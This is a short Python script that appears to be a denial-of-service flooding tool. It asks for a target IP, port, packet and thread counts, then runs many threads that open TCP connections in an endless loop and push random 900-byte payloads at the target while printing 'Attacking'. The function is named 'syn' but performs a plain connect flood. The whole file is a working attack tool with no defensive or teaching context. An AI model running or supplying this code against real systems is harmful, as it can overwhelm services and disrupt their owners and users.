import random
import threading
import socket
import time

ip = input("[+] IP: ")
port = int(input("[+] Port: "))
packet = int(input("[+] Packets: "))
thread = int(input("[+] Threads: "))

print("\n[+] Start.....")
time.sleep(2)
print("\n3")
time.sleep(1)
print("\n2")
time.sleep(1)
print("\n1")
time.sleep(1)
print("\nAttacking ...")
time.sleep(1)

def syn():
    bb = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(random._urandom(900))
            for i in range(packet):
                s.send(random._urandom(900))
            bb += 1
            print('[+] Attacking ' + ip + ' >>> Sent: ' + str(bb))
        except KeyboardInterrupt:
            s.close()
            break

threads = []
for _ in range(thread):
    t = threading.Thread(target=syn)
    t.daemon= True
    t.start()
    threads.append(t)

for t in threads:
    t.join()
